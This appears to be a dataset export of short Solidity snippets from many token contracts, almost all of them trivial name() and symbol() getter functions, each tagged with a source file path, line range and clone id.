<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="68" endline="70" pcid="175">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="54" endline="56" pcid="6639">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="72" endline="74" pcid="7341">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="35" endline="37" pcid="4116">
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="54" endline="56" pcid="9357">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="67" endline="69" pcid="9058">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="72" endline="74" pcid="3118">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="67" endline="69" pcid="6074">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="55" endline="57" pcid="2046">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="66" endline="68" pcid="3986">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="70" endline="72" pcid="3388">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="55" endline="57" pcid="4343">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="66" endline="68" pcid="8991">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="70" endline="72" pcid="5146">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="69" endline="71" pcid="5267">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="54" endline="56" pcid="4428">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="142" endline="144" pcid="372">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="50" endline="52" pcid="8360">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="67" endline="69" pcid="1611">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="73" endline="75" pcid="563">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="49" endline="51" pcid="4027">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="64" endline="66" pcid="1899">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="68" endline="70" pcid="6249">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="67" endline="69" pcid="2765">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="53" endline="55" pcid="2263">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="69" endline="71" pcid="773">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="68" endline="70" pcid="5961">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="53" endline="55" pcid="6315">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="70" endline="72" pcid="190">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="70" endline="72" pcid="3103">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="54" endline="56" pcid="7662">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="54" endline="56" pcid="1240">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="71" endline="73" pcid="4240">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="70" endline="72" pcid="5545">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="68" endline="70" pcid="2801">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="66" endline="68" pcid="6020">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="54" endline="56" pcid="258">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="70" endline="72" pcid="7974">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="69" endline="71" pcid="8214">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="64" endline="66" pcid="7216">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="50" endline="52" pcid="6260">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="33" endline="35" pcid="6546">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="140" endline="142" pcid="3938">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="54" endline="56" pcid="341">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="52" endline="54" pcid="5571">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="70" endline="72" pcid="2912">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="64" endline="66" pcid="5002">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="54" endline="56" pcid="3865">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="66" endline="68" pcid="5764">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="47" endline="49" pcid="7048">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="686" endline="688" pcid="4092">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="53" endline="55" pcid="2848">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="52" endline="54" pcid="7292">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="55" endline="57" pcid="2415">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="54" endline="56" pcid="7800">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="51" endline="53" pcid="6070">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="52" endline="54" pcid="4012">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="386" endline="388" pcid="7907">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="63" endline="65" pcid="6910">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="50" endline="52" pcid="6981">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="53" endline="55" pcid="8595">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="70" endline="72" pcid="9144">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="54" endline="56" pcid="2731">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="53" endline="55" pcid="4964">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="51" endline="53" pcid="9054">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="48" endline="50" pcid="7212">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="65" endline="67" pcid="6516">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="48" endline="50" pcid="3269">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="54" endline="56" pcid="6951">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="34" endline="36" pcid="586">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="56" endline="58" pcid="1861">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="67" endline="69" pcid="292">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="69" endline="71" pcid="5783">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="70" endline="72" pcid="1385">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="63" endline="65" pcid="3839">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x56cf70eb52d13938b15a850ea6400113478c1015.sol" startline="48" endline="50" pcid="3263">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="50" endline="52" pcid="3851">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="67" endline="69" pcid="5077">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="70" endline="72" pcid="1831">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="48" endline="50" pcid="1895">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="50" endline="52" pcid="5197">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="69" endline="71" pcid="5468">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="67" endline="69" pcid="7606">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="54" endline="56" pcid="9342">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="46" endline="48" pcid="5587">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="65" endline="67" pcid="9292">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="68" endline="70" pcid="2942">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="139" endline="141" pcid="3160">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="57" endline="59" pcid="6100">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="686" endline="688" pcid="2214">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="52" endline="54" pcid="9155">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="57" endline="59" pcid="6921">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="54" endline="56" pcid="1366">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="419" endline="421" pcid="7017">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="49" endline="51" pcid="8610">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="72" endline="74" pcid="51">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="67" endline="69" pcid="6379">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="70" endline="72" pcid="262">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="52" endline="54" pcid="5043">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="54" endline="56" pcid="6607">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="70" endline="72" pcid="4932">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="53" endline="55" pcid="769">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="57" endline="59" pcid="574">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="68" endline="70" pcid="433">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="54" endline="56" pcid="1381">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="52" endline="54" pcid="8270">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="66" endline="68" pcid="8349">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="67" endline="69" pcid="2927">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="53" endline="55" pcid="7468">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="55" endline="57" pcid="6713">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="63" endline="65" pcid="975">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="67" endline="69" pcid="5530">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="66" endline="68" pcid="5734">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="670" endline="672" pcid="4088">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="69" endline="71" pcid="2135">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="54" endline="56" pcid="3384">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="54" endline="56" pcid="1880">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="52" endline="54" pcid="1925">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="49" endline="51" pcid="8390">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="53" endline="55" pcid="2180">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="70" endline="72" pcid="8866">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="67" endline="69" pcid="3774">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="70" endline="72" pcid="3759">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="70" endline="72" pcid="160">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="50" endline="52" pcid="3320">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="71" endline="73" pcid="448">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="53" endline="55" pcid="8087">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="70" endline="72" pcid="7666">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="48" endline="50" pcid="4883">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="73" endline="75" pcid="6628">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3d769c9e0240db21fff5338500dd0ecda49ec834.sol" startline="20" endline="22" pcid="2222">
    function get_encrypted_text() public pure returns (string memory) {
        return encrypted_test;
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="66" endline="68" pcid="1460">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="50" endline="52" pcid="7617">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="388" endline="390" pcid="8509">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="50" endline="52" pcid="4823">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="67" endline="69" pcid="8551">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="54" endline="56" pcid="3099">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="47" endline="49" pcid="3525">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="54" endline="56" pcid="8862">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="70" endline="72" pcid="1846">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="68" endline="70" pcid="7959">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="56" endline="58" pcid="8465">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="52" endline="54" pcid="2536">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="69" endline="71" pcid="3208">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="49" endline="51" pcid="7985">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="55" endline="57" pcid="4236">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="50" endline="52" pcid="8778">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="54" endline="56" pcid="9140">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="69" endline="71" pcid="3579">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="56" endline="58" pcid="2076">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="63" endline="65" pcid="1626">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="64" endline="66" pcid="3273">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="50" endline="52" pcid="9173">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="53" endline="55" pcid="2957">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="70" endline="72" pcid="3441">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="52" endline="54" pcid="414">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="53" endline="55" pcid="5464">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
